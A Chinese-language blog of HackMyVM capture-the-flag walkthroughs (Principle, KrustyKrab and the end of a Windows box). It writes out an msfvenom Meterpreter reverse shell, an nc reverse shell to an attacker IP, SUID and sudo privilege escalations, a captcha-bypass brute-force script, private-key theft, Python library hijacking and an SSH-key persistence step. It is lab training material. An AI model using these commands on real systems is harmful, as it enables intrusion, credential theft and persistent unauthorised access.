src="/../imgs/$%7Bfiilename%7D/image-20250425213045943.png" alt="image-20250425213045943"></p><p><img src="/../imgs/$%7Bfiilename%7D/image-20250425213406673.png" alt="image-20250425213406673"></p><p>找到了一些信息包括用户always的登陆密码</p><p>base64解一下即可</p><p>去登陆时发现登录失败</p><p>smb,ssh都失败</p><p>…..</p><p>截至至现在我们拿到了两组密码和用户</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">always:YouCantFindMe.!.!</span><br><span class="line">ftpuser:KeepGoingBro!!!</span><br></pre></td></tr></table></figure><p>利用ftpuser:KeepGoingBro!!!进行尝试</p><p>smb的IPC成功但是什么都看不到</p><p>ssh成功</p><p><img src="/../imgs/$%7Bfiilename%7D/image-20250427175514194.png" alt="image-20250427175514194"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.101.127 lport=6000 -f exe -o test.exe</span><br></pre></td></tr></table></figure><p>生成Meterpreter shell exe</p><p>传到靶机上</p><p><img src="/../imgs/$%7Bfiilename%7D/image-20250427175647234.png" alt="image-20250427175647234"></p><p><img src="/../imgs/$%7Bfiilename%7D/image-20250427175448657.png" alt="image-20250427175448657"></p><p>主机监听,靶机执行文件即可</p><p><img src="/../imgs/$%7Bfiilename%7D/image-20250427180027796.png" alt="image-20250427180027796"></p><p>当前用户没有找到flag</p><p>提权</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">利用</span><br><span class="line">multi/recon/local_exploit_suggester</span><br></pre></td></tr></table></figure><p>找到了十二条可用的payload</p><p><img src="/../imgs/$%7Bfiilename%7D/image-20250427181131466.png" alt="image-20250427181131466"></p><p>第六个成功了</p><p><img src="/../imgs/$%7Bfiilename%7D/image-20250427183716856.png" alt="image-20250427183716856"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bg</span><br><span class="line">退出当前会话</span><br><span class="line">use multi/recon/local_exploit_suggester</span><br><span class="line">set session 1</span><br><span class="line">run</span><br><span class="line">使用模板寻找可利用提权模板</span><br><span class="line">use windows/local/cve_2020_1054_drawiconex_lpe</span><br><span class="line">set session 1</span><br><span class="line">run</span><br><span class="line">提权</span><br></pre></td></tr></table></figure><p>在always桌面找到第一个</p><p><img src="/../imgs/$%7Bfiilename%7D/image-20250427183827368.png" alt="image-20250427183827368"></p><p>在administrator桌面下找到第二个flag</p><p><img src="/../imgs/$%7Bfiilename%7D/image-20250529213112036.png" alt="image-20250529213112036"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>hackmyvm_Principle</title>
      <link href="/2025/05/29/hackmyvm-Principle/"/>
      <url>/2025/05/29/hackmyvm-Principle/</url>
      
        <content type="html"><![CDATA[<p>寻找存活靶机:</p><p><img src="/../imgs/$%7Bfiilename%7D/image-20250423212144764.png" alt="image-20250423212144764"></p><p><img src="/../imgs/$%7Bfiilename%7D/image-20250423212646086.png" alt="image-20250423212646086"></p><p>看一下web服务</p><p><img src="/../imgs/$%7Bfiilename%7D/image-20250423212832052.png" alt="image-20250423212832052"></p><p>简单的一个nginx欢迎页面</p><p>扫到robots.txt</p><p><img src="/../imgs/$%7Bfiilename%7D/image-20250423212942906.png" alt="image-20250423212942906"></p><p>三个路径分别去访问</p><p><img src="/../imgs/$%7Bfiilename%7D/image-20250423213326217.png" alt="image-20250423213326217"></p><p><img src="/../imgs/$%7Bfiilename%7D/image-20250423213349058.png" alt="image-20250423213349058"></p><p><img src="/../imgs/$%7Bfiilename%7D/image-20250423213431687.png" alt="image-20250423213431687"></p><p><img src="/../imgs/$%7Bfiilename%7D/image-20250423213634368.png" alt="image-20250423213634368"></p><p>按照提示去扫目录</p><p>扫到</p><p><img src="/../imgs/$%7Bfiilename%7D/image-20250423213949706.png" alt="image-20250423213949706"></p><p><img src="/../imgs/$%7Bfiilename%7D/image-20250423214118452.png" alt="image-20250423214118452"></p><p><img src="/../imgs/$%7Bfiilename%7D/image-20250423214215015.png" alt="image-20250423214215015"></p><p>得到子域名T4L0S.HMV</p><p>放入hosts文件</p><p>去访问</p><p><img src="/../imgs/$%7Bfiilename%7D/image-20250423214453892.png" alt="image-20250423214453892"></p><p>提示我们还有子域</p><p>枚举</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ffuf -u http://t4l0s.hmv -H &#x27;Host: FUZZ.t4l0s.hmv&#x27; -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -fs 615</span><br></pre></td></tr></table></figure><p><img src="/../imgs/$%7Bfiilename%7D/image-20250423214654126.png" alt="image-20250423214654126"></p><p>也加进hosts文件中</p><p><img src="/../imgs/$%7Bfiilename%7D/image-20250423214905863.png" alt="image-20250423214905863"></p><p>证明了我们方向是对的</p><p>接下来扫一下目录得到upload.php</p><p><img src="/../imgs/$%7Bfiilename%7D/image-20250423220103600.png"></p><p>改掉MIME类型即可上传根据返回包判断出文件路径</p><p>直接nc弹shell即可</p><p><img src="/../imgs/$%7Bfiilename%7D/image-20250423220243223.png" alt="image-20250423220243223"></p><p><img src="/../imgs/$%7Bfiilename%7D/image-20250423221013592.png" alt="image-20250423221013592"></p><p>suid find提权</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find . -exec /bin/sh -p \; -quit</span><br></pre></td></tr></table></figure><p><img src="/../imgs/$%7Bfiilename%7D/image-20250423221122378.png" alt="image-20250423221122378"></p><p><img src="/../imgs/$%7Bfiilename%7D/image-20250423221245525.png" alt="image-20250423221245525"></p><p><img src="/../imgs/$%7Bfiilename%7D/image-20250423221312147.png" alt="image-20250423221312147"></p><p>根据十二神的姓名查找文件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">for line in $(cat name.txt); do find / -iname *$line* 2&gt;/dev/null; done</span><br></pre></td></tr></table></figure><p><img src="/../imgs/$%7Bfiilename%7D/image-20250423221521959.png" alt="image-20250423221521959"></p><p>查看&#x2F;etc&#x2F;selinux&#x2F;Afrodita.key</p><p><img src="/../imgs/$%7Bfiilename%7D/image-20250423221613104.png" alt="image-20250423221613104"></p><p>得到了talos密码</p><p><img src="/../imgs/$%7Bfiilename%7D/image-20250423221804405.png" alt="image-20250423221804405"></p><p>切换用户后发现可以elohim权限用cp</p><p>这样我们就可以借助打印缓冲区读取我们想要读取的文件</p><p><img src="/../imgs/$%7Bfiilename%7D/image-20250423222513123.png" alt="image-20250423222513123"></p><p>查看端口开放服务</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ss -tlune</span><br></pre></td></tr></table></figure><p><img src="/../imgs/$%7Bfiilename%7D/image-20250423222636949.png" alt="image-20250423222636949"></p><p>3445有ssh服务但是我们又不能直接访问</p><p>所以我们将其流量代理出来之后再用ssh登录</p><p>我们找不到gehenna的明文密码但是可以</p><p>ssh密钥登陆</p><p>私钥一般在</p><p>&#x2F;home&#x2F;用户名&#x2F;.ssh&#x2F;id_rsa</p><p>读私钥</p><p><img src="/../imgs/$%7Bfiilename%7D/image-20250423223338004.png" alt="image-20250423223338004"></p><p>然后在将chisel传到靶机上</p><p>进行流量代理</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./chisel client 192.168.56.103:1475 R:3445:localhost:3445</span><br></pre></td></tr></table></figure><p><img src="/../imgs/$%7Bfiilename%7D/image-20250417193425721.png" alt="image-20250417193425721"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./chisel server --reverse -p 1475</span><br></pre></td></tr></table></figure><p><img src="/../imgs/$%7Bfiilename%7D/image-20250417193446103.png" alt="image-20250417193446103"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh -i rsa_principle -p 3445 elohim@localhost </span><br></pre></td></tr></table></figure><p>登陆时发现私钥使用需要输入密码</p><p><img src="/../imgs/$%7Bfiilename%7D/image-20250423223821962.png" alt="image-20250423223821962"></p><p><img src="/../imgs/$%7Bfiilename%7D/image-20250423224010552.png" alt="image-20250423224010552"></p><p>在.lock文件中找到十六进制密码</p><p><img src="/../imgs/$%7Bfiilename%7D/image-20250423224139961.png" alt="image-20250423224139961"></p><p>有了密码登陆即可</p><p><img src="/../imgs/$%7Bfiilename%7D/image-20250417193452301.png" alt="image-20250417193452301"></p><p><img src="/../imgs/$%7Bfiilename%7D/image-20250417193800418.png" alt="image-20250417193800418"></p><p>绕过受限 shell </p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash --noprofile --norc</span><br></pre></td></tr></table></figure><p><img src="/../imgs/$%7Bfiilename%7D/image-20250417193749133.png" alt="image-20250417193749133"></p><p>发现root权限脚本</p><p>查看脚本内容</p><p><img src="/../imgs/$%7Bfiilename%7D/image-20250417193847360.png" alt="image-20250417193847360"></p><p><img src="/../imgs/$%7Bfiilename%7D/image-20250417194143137.png" alt="image-20250417194143137"></p><p>查看ssubprocess.py</p><p><img src="/../imgs/$%7Bfiilename%7D/image-20250417194255390.png" alt="image-20250417194255390"></p><p>由于我们属于 sml 组，我们有写入权限，所以一切都指向 python 库劫持。</p><p><img src="/../imgs/$%7Bfiilename%7D/image-20250417194915258.png" alt="image-20250417194915258"></p><p>成功提权到root权限</p><p><img src="/../imgs/$%7Bfiilename%7D/image-20250529213242583.png" alt="image-20250529213242583"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>hackmyvm_KrustyKrab</title>
      <link href="/2025/05/29/hackmyvm-KrustyKrab/"/>
      <url>/2025/05/29/hackmyvm-KrustyKrab/</url>
      
        <content type="html"><![CDATA[<p><img src="/../imgs/$%7Bfiilename%7D/image-20250528202444683.png" alt="image-20250528202444683"></p><p>踩点</p><p><img src="/../imgs/$%7Bfiilename%7D/image-20250528210323627.png" alt="image-20250528210323627"></p><p>80端口访问是一个Apache 默认页</p><p>在源码中得到</p><p>&#x2F;var&#x2F;www&#x2F;html&#x2F;finexo</p><p>访问finexo</p><p>有登录功能</p><p><img src="/../imgs/$%7Bfiilename%7D/image-20250528210635599.png" alt="image-20250528210635599"></p><p>第一个用户存在</p><p>在登录页面的源码中发现js文件</p><p><img src="/../imgs/$%7Bfiilename%7D/image-20250528210751072.png" alt="image-20250528210751072"></p><p><img src="/../imgs/$%7Bfiilename%7D/image-20250528210800494.png" alt="image-20250528210800494"></p><p>很明显的jsfuck</p><p>解出</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function generateCaptcha() &#123;</span><br><span class="line">    $characters = &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789&quot;;</span><br><span class="line">    $code = &quot;&quot;;</span><br><span class="line">    $seed = time();</span><br><span class="line">    mt_srand($seed);</span><br><span class="line">    for ($i = 0; $i &lt; 4; $i++) &#123;</span><br><span class="line">        $code .= $characters[mt_rand(0, strlen($characters) - 1)];</span><br><span class="line">    &#125;</span><br><span class="line">    $_SESSION[&#x27;captcha&#x27;] = strtolower($code);</span><br><span class="line">    return $code;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>得到了验证码的生成逻辑</p><p>依靠<code>Unix</code>时间戳挑选出四个字母组成验证码</p><p><img src="/../imgs/$%7Bfiilename%7D/image-20250528213457184.png" alt="image-20250528213457184"></p><p>发现访问<a href="http://ip/finexo/login.php?action=generateCaptcha">http://ip/finexo/login.php?action=generateCaptcha</a></p><p>直接就会给出验证码我们写爆破脚本访问那验证码即可</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests # 导入 requests 库，用于发送 HTTP 请求</span><br><span class="line"></span><br><span class="line"># 定义目标 URL</span><br><span class="line"># 注意：请确保这里的 IP 地址是你要测试的实际目标 IP！</span><br><span class="line"># 根据之前的讨论，如果是原来的目标，应该是 &#x27;http://192.168.56.132/finexo/login.php&#x27;</span><br><span class="line">captcha_url = &#x27;http://192.168.56.132/finexo/login.php?action=generateCaptcha&#x27; # 验证码生成接口的 URL</span><br><span class="line">login_url = &#x27;http://192.168.56.132/finexo/login.php&#x27; # 登录页面的 URL</span><br><span class="line"></span><br><span class="line"># 创建会话对象</span><br><span class="line"># 使用 requests.Session() 可以保持会话（例如，管理 cookies），这对于登录和验证码机制至关重要。</span><br><span class="line">session = requests.Session()</span><br><span class="line"></span><br><span class="line">cnt = 0 # 初始化尝试次数计数器</span><br><span class="line"></span><br><span class="line"># 打开 rockyou.txt 字典文件</span><br><span class="line"># &#x27;r&#x27; 表示只读模式，encoding=&quot;utf-8&quot; 指定文件编码，errors=&quot;ignore&quot; 忽略编码错误</span><br><span class="line">with open(&#x27;rockyou.txt&#x27;, &#x27;r&#x27;, encoding=&quot;utf-8&quot;, errors=&quot;ignore&quot;) as f:</span><br><span class="line">    # 遍历字典文件中的每一行（每个密码）</span><br><span class="line">    for password in f.readlines():</span><br><span class="line"></span><br><span class="line">        # 步骤1: 获取验证码</span><br><span class="line">        # 向验证码生成接口发送 GET 请求，获取响应文本，去除空白字符，并转换为小写。</span><br><span class="line">        # 这是利用了验证码文本直接返回给前端的漏洞点。</span><br><span class="line">        try:</span><br><span class="line">            captcha_response = session.get(captcha_url)</span><br><span class="line">            captcha = captcha_response.text.strip().lower()</span><br><span class="line">            if not captcha: # 如果获取到的验证码为空，则跳过此次尝试</span><br><span class="line">                print(f&quot;  [警告] 无法获取验证码，跳过密码: &#123;password.strip()&#125;&quot;)</span><br><span class="line">                continue</span><br><span class="line">        except requests.exceptions.RequestException as e:</span><br><span class="line">            print(f&quot;  [错误] 获取验证码失败: &#123;e&#125;，跳过密码: &#123;password.strip()&#125;&quot;)</span><br><span class="line">            continue</span><br><span class="line"></span><br><span class="line">        # 去除从字典文件中读取的密码两端的空白字符（如换行符）</span><br><span class="line">        password = password.strip()</span><br><span class="line"></span><br><span class="line">        # 构造登录请求的 POST 数据</span><br><span class="line">        data = &#123;</span><br><span class="line">            &#x27;username&#x27;: &#x27;spongebob&#x27;, # 确定用户名为 &#x27;spongebob&#x27;</span><br><span class="line">            &#x27;password&#x27;: f&#x27;&#123;password&#125;&#x27;, # 使用当前字典中的密码</span><br><span class="line">            &#x27;captcha&#x27;: captcha # 使用实时获取到的验证码</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        # 步骤2: 发送 POST 请求进行登录</span><br><span class="line">        # 使用会话对象发送数据到登录 URL</span><br><span class="line">        try_login = session.post(login_url, data=data)</span><br><span class="line">        cnt += 1 # 每次尝试后增加计数</span><br><span class="line"></span><br><span class="line">        # 输出当前尝试的密码和总尝试次数，便于跟踪进度</span><br><span class="line">        print(f&quot;正在尝试密码: &#123;password&#125; (第 &#123;cnt&#125; 次尝试)&quot;)</span><br><span class="line"></span><br><span class="line">        # 步骤3: 检查登录结果</span><br><span class="line">        # 判断响应文本中是否包含表示登录成功的关键词 &quot;successful&quot;</span><br><span class="line">        if &quot;successful&quot; in try_login.text:</span><br><span class="line">            print(f&quot;\n--- 成功！---&quot;)</span><br><span class="line">            print(f&quot;登录成功，找到密码: &#123;password&#125;&quot;)</span><br><span class="line">            # 找到密码后，立即停止循环</span><br><span class="line">            break</span><br><span class="line">        # 如果你还想查看其他非成功非明确错误的响应，可以在这里添加更详细的条件和打印。</span><br><span class="line">        # 目前脚本只打印成功信息。</span><br></pre></td></tr></table></figure><p>根据靶机无处不在的海绵宝宝元素生成密码本进行爆破</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">spongebob</span><br><span class="line">Spongebob</span><br><span class="line">SPONGEBOB</span><br><span class="line">spongebob1</span><br><span class="line">spongebob123</span><br><span class="line">spongebob@</span><br><span class="line">spongebob!</span><br><span class="line">spongebob_squarepants</span><br><span class="line">SpongeBobSquarePants</span><br><span class="line">squarepants</span><br><span class="line">Squarepants</span><br><span class="line">patrick</span><br><span class="line">Patrick</span><br><span class="line">PATRICK</span><br><span class="line">patrick123</span><br><span class="line">star</span><br><span class="line">Star</span><br><span class="line">squidward</span><br><span class="line">Squidward</span><br><span class="line">SQUIDWARD</span><br><span class="line">tentacles</span><br><span class="line">mrkrabs</span><br><span class="line">Mrkrabs</span><br><span class="line">MrKrabs</span><br><span class="line">krabs</span><br><span class="line">Krabs</span><br><span class="line">pearl</span><br><span class="line">Pearl</span><br><span class="line">sandy</span><br><span class="line">Sandy</span><br><span class="line">chipmunk</span><br><span class="line">plankton</span><br><span class="line">Plankton</span><br><span class="line">chum</span><br><span class="line">bucket</span><br><span class="line">ChumBucket</span><br><span class="line">gary</span><br><span class="line">Gary</span><br><span class="line">meow</span><br><span class="line">pineapple</span><br><span class="line">Pineapple</span><br><span class="line">bikini</span><br><span class="line">bottom</span><br><span class="line">BikiniBottom</span><br><span class="line">krabbypatty</span><br><span class="line">KrabbyPatty</span><br><span class="line">formula</span><br><span class="line">secretformula</span><br><span class="line">jellyfish</span><br><span class="line">Jellyfish</span><br><span class="line">net</span><br><span class="line">bubble</span><br><span class="line">Bubble</span><br><span class="line">blower</span><br><span class="line">clarinet</span><br><span class="line">Clarinet</span><br><span class="line">gloveworld</span><br><span class="line">GloveWorld</span><br><span class="line">rockbottom</span><br><span class="line">RockBottom</span><br><span class="line">goofygoober</span><br><span class="line">GoofyGoober</span><br><span class="line">jellyfishing</span><br><span class="line">Jellyfishing</span><br><span class="line">chumbucket</span><br><span class="line">kelprea</span><br><span class="line">thekrustykrab</span><br><span class="line">KrustyKrab</span><br><span class="line">finexo</span><br><span class="line">Finexo</span><br><span class="line">finexo123</span><br><span class="line">finexo@</span><br><span class="line">finexo!</span><br></pre></td></tr></table></figure><p><img src="/../imgs/$%7Bfiilename%7D/image-20250528214610227.png" alt="image-20250528214610227"></p><p>成功得到密码SpongeBob&#x2F;squarepants</p><p><img src="/../imgs/$%7Bfiilename%7D/image-20250528221624985.png" alt="image-20250528221624985"></p><p>可以上传图片🐎</p><p>但是抓住这个包可以改身份</p><p>但是不能利用</p><p><img src="/../imgs/$%7Bfiilename%7D/image-20250529134904893.png" alt="image-20250529134904893"></p><p>可以直接更改身份为Administratro但是失败了不能直接变为Administratro但是我们仍然成功为Administratro更改了密码</p><p><img src="/../imgs/$%7Bfiilename%7D/image-20250529135541104.png" alt="image-20250529135541104"></p><p>成功登录</p><p><img src="/../imgs/$%7Bfiilename%7D/image-20250529135654682.png" alt="image-20250529135654682"></p><p>管理员就是好可以直接执行命令</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc 192.168.56.103 8888 -e /bin/sh</span><br></pre></td></tr></table></figure><p>监听得到shell</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">www-data@KrustyKrab:/home$ sudo -l</span><br><span class="line">Matching Defaults entries for www-data on KrustyKrab:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty</span><br><span class="line"></span><br><span class="line">User www-data may run the following commands on KrustyKrab:</span><br><span class="line">    (KrustyKrab) NOPASSWD: /usr/bin/split</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">www-data@KrustyKrab:/home$ sudo -u KrustyKrab split --filter=/bin/sh /dev/stdin</span><br><span class="line">whoami</span><br><span class="line">KrustyKrab</span><br></pre></td></tr></table></figure><p>在KrustyKrab目录下得到userflag</p><p>权限维持可以搞个ssh密钥登陆</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mkdir -p ~/.ssh</span><br><span class="line">echo &quot;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQD0lTDrkYOmPAyKqDSdWVZuDsOnMhScsUK765Po98D9HXbhTKDUbBQ6QhcfTOfiKI/rTK8sgKyulNd6Uyf/MBV7YT6qOtzP7fQ054PFZQViXQNwtcsFmyFLHlnpZzsfoC1eW3EX1/6pyNWfNr+SZrbWJOnaqTzq5ajT9Yob/BSMjrFFnckfqlfFSryTVTFtT64wlyo2x7o6aE9Fvc7b/tWqBZT/H2EqRFZ/4mwz69jrXO6xwhxbNDpPclwhSCR1POMy5HYMPB1cV2vCG+ecwqYR1tbpb5FsksJlKKZe4PPueYBTR1LkIrm12kLLiTzcdcXnVsBtiTrtv/NEi0VwMeD9UWwaUW2k31sE2cehVHeVlas1vQg/t51/kVfTptlrvPWxjSClzxh+Nxtb9AlE87f+9Km2CgwdG9q4UZ4T6sc0xTbtva/N+FEPKuq9kV9Hn7LrLFG9XlkttLh4NggFRW0ddRT3HlJkpJ52LkxaB4+OjoomPp4/LcS7RUkKnn1gEns= root@kali&quot;&gt;~/.ssh/authorized_keys</span><br><span class="line">chmod 600 ~/.ssh/authorized_keys</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[/myift/krus]</span><br><span class="line">└─# ssh KrustyKrab@192.168.56.132 -i id_rsa </span><br><span class="line">The authenticity of host &#x27;192.168.56.132 (192.168.56.132)&#x27; can&#x27;t be established.</span><br><span class="line">ED25519 key fingerprint is SHA256:0d4MWSfQ+tUZ0f4j8Wea2uYelBzzcaj0CI4NtYQIx0E.</span><br><span class="line">This key is not known by any other names.</span><br><span class="line">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span><br><span class="line">Warning: Permanently added &#x27;192.168.56.132&#x27; (ED25519) to the list of known hosts.</span><br><span class="line">Linux KrustyKrab 6.1.0-9-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.27-1 (2023-05-08) x86_64</span><br><span class="line"></span><br><span class="line">The programs included with the Debian GNU/Linux system are free software;</span><br><span class="line">the exact distribution terms for each program are described in the</span><br><span class="line">individual files in /usr/share/doc/*/copyright.</span><br><span class="line"></span><br><span class="line">Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span><br><span class="line">permitted by applicable law.</span><br><span class="line">Last login: Sun Mar 30 00:15:24 2025 from 192.168.56.118</span><br><span class="line">KrustyKrab@KrustyKrab:~$ </span><br><span class="line"></span><br></pre></td></tr></table></figure><p>KrustyKrab目录下还有个help图片</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[/myift/krus]</span><br><span class="line">└─# file help                           </span><br><span class="line">help: GIF image data, version 89a, 480 x 270</span><br><span class="line"></span><br><span class="line">KrustyKrab@KrustyKrab:~$ sudo -l</span><br><span class="line">Matching Defaults entries for KrustyKrab on KrustyKrab:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty</span><br><span class="line"></span><br><span class="line">User KrustyKrab may run the following commands on KrustyKrab:</span><br><span class="line">    (spongebob) NOPASSWD: /usr/bin/ttteeesssttt</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/../imgs/$%7Bfiilename%7D/image-20250529153951742.png" alt="image-20250529153951742"></p><p>使用&#x2F;usr&#x2F;bin&#x2F;ttteeesssttt操作</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">KrustyKrab@KrustyKrab:~$ sudo -u spongebob /usr/bin/ttteeesssttt</span><br><span class="line"></span><br><span class="line">Spongebob forgot how to make Krabby Patty, You need to help him!</span><br><span class="line"></span><br><span class="line">Current shuffled recipe order:</span><br><span class="line">A: Pickles</span><br><span class="line">B: Ketchup</span><br><span class="line">C: Lettuce</span><br><span class="line">D: Patty</span><br><span class="line">E: Onion</span><br><span class="line">F: Top bun</span><br><span class="line">G: Mustard</span><br><span class="line">H: Cheese</span><br><span class="line">I: Tomato</span><br><span class="line">J: Bottom bun</span><br><span class="line"></span><br><span class="line">Please enter the correct order using letters (e.g., ABCDEFGHIJ):</span><br><span class="line">Enter 10 letters (A-J): </span><br><span class="line"></span><br></pre></td></tr></table></figure><p>答案就在动图中</p><p><img src="/../imgs/$%7Bfiilename%7D/image-20250529154515733.png" alt="image-20250529154515733"></p><p><img src="/../imgs/$%7Bfiilename%7D/image-20250529154523604.png" alt="image-20250529154523604"></p><p><img src="/../imgs/$%7Bfiilename%7D/image-20250529154534468.png" alt="image-20250529154534468"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">KrustyKrab@KrustyKrab:~$ sudo -u spongebob /usr/bin/ttteeesssttt</span><br><span class="line"></span><br><span class="line">Spongebob forgot how to make Krabby Patty, You need to help him!</span><br><span class="line"></span><br><span class="line">Current shuffled recipe order:</span><br><span class="line">A: Tomato</span><br><span class="line">B: Onion</span><br><span class="line">C: Lettuce</span><br><span class="line">D: Ketchup</span><br><span class="line">E: Pickles</span><br><span class="line">F: Top bun</span><br><span class="line">G: Patty</span><br><span class="line">H: Cheese</span><br><span class="line">I: Bottom bun</span><br><span class="line">J: Mustard</span><br><span class="line"></span><br><span class="line">Please enter the correct order using letters (e.g., ABCDEFGHIJ):</span><br><span class="line">Enter 10 letters (A-J): IGCHBADJEF</span><br><span class="line"></span><br><span class="line">Validation successful! Perfect Krabby Patty!</span><br><span class="line">spongebob@KrustyKrab:/home/KrustyKrab$ </span><br><span class="line"></span><br></pre></td></tr></table></figure><p>直接就来到了spongebob用户</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">spongebob@KrustyKrab:/home/KrustyKrab$ cd</span><br><span class="line">spongebob@KrustyKrab:~$ ls</span><br><span class="line">key1  key2.jpeg  note.txt</span><br><span class="line">spongebob@KrustyKrab:~$ file key1</span><br><span class="line">key1: ASCII text</span><br><span class="line">spongebob@KrustyKrab:~$ cat key1</span><br><span class="line">e1964798cfe86e914af895f8d0291812</span><br><span class="line">spongebob@KrustyKrab:~$ cat note.txt</span><br><span class="line"></span><br><span class="line">Squidward is waiting for you!!!!</span><br><span class="line"></span><br><span class="line">password is md5($key1$key2).</span><br><span class="line"></span><br><span class="line">It&#x27;s not so hard as you think.</span><br><span class="line"></span><br><span class="line">You have new mail in /var/mail/spongebob</span><br><span class="line">章鱼哥在等你！！！！</span><br><span class="line"></span><br><span class="line">密码为md5（$key1$key2）。</span><br><span class="line"></span><br><span class="line">没有你想的那么难。</span><br><span class="line"></span><br><span class="line">在/var/mail/spongebob中有新邮件</span><br><span class="line">spongebob@KrustyKrab:~$ </span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/../imgs/$%7Bfiilename%7D/image-20250529155642899.png" alt="image-20250529155642899"></p><p>(好帅的章鱼哥)</p><p>本来以为key2藏在里面结果是我想多了</p><p>直接拿图片的md5值</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[/myift/krus]</span><br><span class="line">└─# md5sum key2.jpeg              </span><br><span class="line">5e1d0c1a168dc2d70004c2b00ba314ae  key2.jpeg</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>直接计算</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[/myift/krus]</span><br><span class="line">└─# echo -n &quot;e1964798cfe86e914af895f8d02918125e1d0c1a168dc2d70004c2b00ba314ae&quot; | md5sum</span><br><span class="line">7ac254848d6e4556b73398dde2e4ef82  -                                     </span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">spongebob@KrustyKrab:/home$ su Squidward</span><br><span class="line">Password: </span><br><span class="line">$ whoami </span><br><span class="line">Squidward</span><br></pre></td></tr></table></figure><p>登录成功</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ find / -perm -u=s -type f 2&gt;/dev/null</span><br><span class="line">/home/Squidward/laststep</span><br><span class="line">/usr/lib/dbus-1.0/dbus-daemon-launch-helper</span><br><span class="line">/usr/lib/openssh/ssh-keysign</span><br><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/bin/umount</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/usr/bin/su</span><br><span class="line">/usr/bin/at</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/bin/sudo</span><br><span class="line">/usr/bin/mount</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/sbin/exim4</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>发现可利用文件laststep</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ file laststep</span><br><span class="line">laststep: setuid ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=b84dc5079c77a9f2f2d82492f95a9c110ec51c87, for GNU/Linux 3.2.0, not stripped</span><br><span class="line">$ strings laststep</span><br><span class="line">/lib64/ld-linux-x86-64.so.2</span><br><span class="line">setgid</span><br><span class="line">setuid</span><br><span class="line">system</span><br><span class="line">__libc_start_main</span><br><span class="line">__cxa_finalize</span><br><span class="line">libc.so.6</span><br><span class="line">GLIBC_2.2.5</span><br><span class="line">GLIBC_2.34</span><br><span class="line">_ITM_deregisterTMCloneTable</span><br><span class="line">__gmon_start__</span><br><span class="line">_ITM_registerTMCloneTable</span><br><span class="line">PTE1</span><br><span class="line">u+UH</span><br><span class="line">cat /etc/shadow</span><br><span class="line">;*3$&quot;</span><br><span class="line">GCC: (Debian 12.2.0-14) 12.2.0</span><br><span class="line">Scrt1.o</span><br><span class="line">__abi_tag</span><br><span class="line">crtstuff.c</span><br><span class="line">deregister_tm_clones</span><br><span class="line">__do_global_dtors_aux</span><br><span class="line">completed.0</span><br><span class="line">__do_global_dtors_aux_fini_array_entry</span><br><span class="line">frame_dummy</span><br><span class="line">__frame_dummy_init_array_entry</span><br><span class="line">test.c</span><br><span class="line">__FRAME_END__</span><br><span class="line">_DYNAMIC</span><br><span class="line">__GNU_EH_FRAME_HDR</span><br><span class="line">_GLOBAL_OFFSET_TABLE_</span><br><span 